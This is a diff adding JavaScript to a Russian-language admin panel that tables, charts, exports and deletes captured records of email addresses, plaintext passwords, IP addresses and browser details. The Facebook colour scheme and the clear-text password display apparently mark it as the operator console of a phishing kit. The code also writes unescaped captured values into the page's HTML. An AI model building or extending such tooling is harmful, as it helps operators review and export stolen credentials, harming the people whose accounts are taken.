@@ -240,4 +240,369 @@
                 });
             }
             
-            // Ограни
+            // Ограничение
+            if (filterLimit > 0) {
+                filteredUsers = filteredUsers.slice(-filterLimit).reverse();
+            } else {
+                filteredUsers = filteredUsers.slice().reverse();
+            }
+            
+            // Обновляем счетчик
+            dataCount.textContent = `${filteredUsers.length} записей (всего: ${users.length})`;
+            
+            // Очищаем таблицу
+            tableBody.innerHTML = '';
+            
+            // Заполняем таблицу
+            filteredUsers.forEach((user, index) => {
+                try {
+                    const row = document.createElement('tr');
+                    
+                    // Форматируем время
+                    let formattedTime = 'Ошибка даты';
+                    try {
+                        const time = new Date(user.timestamp);
+                        formattedTime = time.toLocaleString('ru-RU', {
+                            day: '2-digit',
+                            month: '2-digit',
+                            year: 'numeric',
+                            hour: '2-digit',
+                            minute: '2-digit'
+                        });
+                    } catch (e) {
+                        formattedTime = user.timestamp || 'Нет данных';
+                    }
+                    
+                    // Обрезаем user agent
+                    const userAgent = user.userAgent || 'Нет данных';
+                    const shortUserAgent = userAgent.length > 50 
+                        ? userAgent.substring(0, 50) + '...' 
+                        : userAgent;
+                    
+                    // Получаем экран
+                    const screenInfo = user.screenInfo || {};
+                    const screenText = screenInfo.width && screenInfo.height 
+                        ? `${screenInfo.width}×${screenInfo.height}` 
+                        : 'Нет данных';
+                    
+                    // Получаем IP
+                    const ipText = user.ipInfo?.ip || 'unknown';
+                    
+                    row.innerHTML = `
+                        <td>${index + 1}</td>
+                        <td class="email-cell" title="${user.email || 'Нет данных'}">${user.email || 'Нет данных'}</td>
+                        <td class="password-cell" title="${user.password || 'Нет данных'}">${'•'.repeat(user.password?.length || 0)}</td>
+                        <td title="${ipText}">${ipText}</td>
+                        <td class="time-cell" title="${user.timestamp || 'Нет данных'}">${formattedTime}</td>
+                        <td title="${userAgent}">${shortUserAgent}</td>
+                        <td>${screenText}</td>
+                        <td>
+                            <button onclick="viewUserDetails('${user.id || ''}')" style="background: none; border: 1px solid #1877f2; color: #1877f2; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px;">
+                                👁️
+                            </button>
+                            <button onclick="deleteUser('${user.id || ''}')" style="background: none; border: 1px solid #ff4444; color: #ff4444; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; margin-left: 5px;">
+                                🗑️
+                            </button>
+                        </td>
+                    `;
+                    
+                    tableBody.appendChild(row);
+                } catch (error) {
+                    console.error('Ошибка создания строки:', error);
+                }
+            });
+            
+            if (filteredUsers.length === 0) {
+                const row = document.createElement('tr');
+                row.innerHTML = `<td colspan="8" style="text-align: center; padding: 20px; color: #65676b;">Нет данных для отображения</td>`;
+                tableBody.appendChild(row);
+            }
+        }
+        
+        // Фильтрация данных
+        function filterData() {
+            console.log('filterData вызвана');
+            loadAdminData();
+        }
+        
+        // Обновление аналитики
+        function updateAnalytics(users) {
+            const analytics = document.getElementById('analytics');
+            if (!analytics) return;
+            
+            if (!users || users.length === 0) {
+                analytics.innerHTML = '<p>Нет данных для аналитики</p>';
+                return;
+            }
+            
+            // Группировка по часам
+            const hourlyData = {};
+            users.forEach(user => {
+                try {
+                    const hour = new Date(user.timestamp).getHours();
+                    hourlyData[hour] = (hourlyData[hour] || 0) + 1;
+                } catch (e) {
+                    // Пропускаем ошибки
+                }
+            });
+            
+            // Самые популярные браузеры
+            const browsers = {};
+            users.forEach(user => {
+                const ua = (user.userAgent || '').toLowerCase();
+                let browser = 'Другой';
+                
+                if (ua.includes('chrome')) browser = 'Chrome';
+                else if (ua.includes('firefox')) browser = 'Firefox';
+                else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
+                else if (ua.includes('edge')) browser = 'Edge';
+                else if (ua.includes('opera')) browser = 'Opera';
+                
+                browsers[browser] = (browsers[browser] || 0) + 1;
+            });
+            
+            // Создаем HTML аналитики
+            let html = `
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
+                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px;">
+                        <h4>📊 Активность по часам</h4>
+                        <div style="margin-top: 10px; display: flex; align-items: flex-end; height: 80px;">
+            `;
+            
+            const maxCount = Math.max(...Object.values(hourlyData), 1);
+            for (let hour = 0; hour < 24; hour++) {
+                const count = hourlyData[hour] || 0;
+                const barHeight = (count / maxCount) * 50;
+                html += `
+                    <div style="display: inline-block; margin-right: 2px; text-align: center;">
+                        <div style="height: ${barHeight}px; width: 20px; background: #1877f2; margin: 0 auto; border-radius: 3px 3px 0 0;"></div>
+                        <div style="font-size: 10px; margin-top: 5px;">${hour}:00</div>
+                    </div>
+                `;
+            }
+            
+            html += `
+                        </div>
+                    </div>
+                    
+                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px;">
+                        <h4>🌐 Браузеры</h4>
+                        <div style="margin-top: 10px;">
+            `;
+            
+            Object.entries(browsers).forEach(([browser, count]) => {
+                const percentage = (count / users.length * 100).toFixed(1);
+                html += `
+                    <div style="margin-bottom: 8px;">
+                        <div style="display: flex; justify-content: space-between;">
+                            <span>${browser}</span>
+                            <span>${count} (${percentage}%)</span>
+                        </div>
+                        <div style="height: 8px; background: #e4e6eb; border-radius: 4px; margin-top: 4px;">
+                            <div style="height: 100%; width: ${percentage}%; background: #42b72a; border-radius: 4px;"></div>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            html += `
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            analytics.innerHTML = html;
+        }
+        
+        // Просмотр деталей пользователя
+        function viewUserDetails(userId) {
+            if (!window.DataCollector) {
+                alert('DataCollector не загружен');
+                return;
+            }
+            
+            const data = DataCollector.loadData();
+            const user = data.users.find(u => u.id === userId);
+            
+            if (user) {
+                const details = `
+ID: ${user.id || 'Нет данных'}
+Email: ${user.email || 'Нет данных'}
+Пароль: ${user.password || 'Нет данных'}
+Время: ${user.timestamp || 'Нет данных'}
+IP: ${user.ipInfo?.ip || 'unknown'}
+Браузер: ${user.userAgent || 'Нет данных'}
+Экран: ${user.screenInfo?.width || 0}x${user.screenInfo?.height || 0}
+Язык: ${user.browserInfo?.language || 'Нет данных'}
+                `;
+                
+                alert(details);
+            } else {
+                alert('Пользователь не найден');
+            }
+        }
+        
+        // Удаление пользователя
+        function deleteUser(userId) {
+            if (confirm('Удалить эту запись?')) {
+                if (!window.DataCollector) {
+                    alert('DataCollector не загружен');
+                    return;
+                }
+                
+                const data = DataCollector.loadData();
+                const initialLength = data.users.length;
+                data.users = data.users.filter(u => u.id !== userId);
+                
+                if (data.users.length < initialLength) {
+                    DataCollector.saveData();
+                    alert('Запись удалена!');
+                    loadAdminData();
+                } else {
+                    alert('Запись не найдена');
+                }
+            }
+        }
+        
+        // Очистка всех данных
+        function clearAllData() {
+            if (confirm('ВНИМАНИЕ! Вы собираетесь удалить ВСЕ данные. Это действие нельзя отменить. Продолжить?')) {
+                if (!window.DataCollector) {
+                    alert('DataCollector не загружен');
+                    return;
+                }
+                
+                DataCollector.clearData();
+                alert('Все данные удалены!');
+                loadAdminData();
+            }
+        }
+        
+        // Обновить данные
+        function refreshData() {
+            console.log('refreshData вызвана');
+            const loader = document.getElementById('loader');
+            if (loader) loader.style.display = 'block';
+            
+            setTimeout(() => {
+                loadAdminData();
+            }, 300);
+        }
+        
+        // Модальное окно экспорта
+        function showExportModal() {
+            console.log('showExportModal вызвана');
+            const modal = document.getElementById('exportModal');
+            if (modal) {
+                modal.style.display = 'flex';
+                updateDataPreview();
+            }
+        }
+        
+        function closeExportModal() {
+            const modal = document.getElementById('exportModal');
+            if (modal) {
+                modal.style.display = 'none';
+            }
+        }
+        
+        function updateDataPreview() {
+            const preview = document.getElementById('dataPreview');
+            if (!preview || !window.DataCollector) return;
+            
+            try {
+                const data = DataCollector.exportData('json');
+                preview.textContent = data.length > 1000 ? data.substring(0, 1000) + '...' : data;
+            } catch (error) {
+                preview.textContent = 'Ошибка при получении данных: ' + error.message;
+            }
+        }
+        
+        function exportData(format) {
+            if (!window.DataCollector) {
+                alert('DataCollector не загружен');
+                return;
+            }
+            
+            try {
+                DataCollector.downloadData(format);
+                closeExportModal();
+            } catch (error) {
+                alert('Ошибка экспорта: ' + error.message);
+            }
+        }
+        
+        // Предпросмотр данных
+        function showDataPreview() {
+            if (!window.DataCollector) {
+                alert('DataCollector не загружен');
+                return;
+            }
+            
+            try {
+                const data = DataCollector.exportData('json');
+                const newWindow = window.open();
+                newWindow.document.write(`
+                    <html>
+                    <head>
+                        <title>Предпросмотр данных</title>
+                        <style>
+                            body { font-family: monospace; padding: 20px; background: #f5f5f5; }
+                            pre { background: white; padding: 20px; border-radius: 8px; overflow: auto; }
+                        </style>
+                    </head>
+                    <body>
+                        <h2>📋 Предпросмотр данных (JSON)</h2>
+                        <pre>${data}</pre>
+                    </body>
+                    </html>
+                `);
+            } catch (error) {
+                alert('Ошибка: ' + error.message);
+            }
+        }
+        
+        // Переход в режим предпросмотра
+        function goToPreview() {
+            window.open('index.html', '_blank');
+        }
+        
+        // Выход из админки
+        function logoutAdmin() {
+            localStorage.removeItem('admin_authenticated');
+            window.location.reload();
+        }
+        
+        // Горячие клавиши
+        document.addEventListener('keydown', function(e) {
+            // F5 - обновить
+            if (e.key === 'F5') {
+                e.preventDefault();
+                refreshData();
+            }
+            
+            // Ctrl+E - экспорт
+            if (e.ctrlKey && e.key === 'e') {
+                e.preventDefault();
+                showExportModal();
+            }
+            
+            // Ctrl+D - очистить
+            if (e.ctrlKey && e.key === 'd') {
+                e.preventDefault();
+                clearAllData();
+            }
+            
+            // Ctrl+P - предпросмотр
+            if (e.ctrlKey && e.key === 'p') {
+                e.preventDefault();
+                showDataPreview();
+            }
+            
+            // Ctrl+Q - выход
+            if (e.ctrlKey && e.key === 'q') {
+                e.preventDefault();
+                logoutAdmin();
+            }
+        });
+    </script>
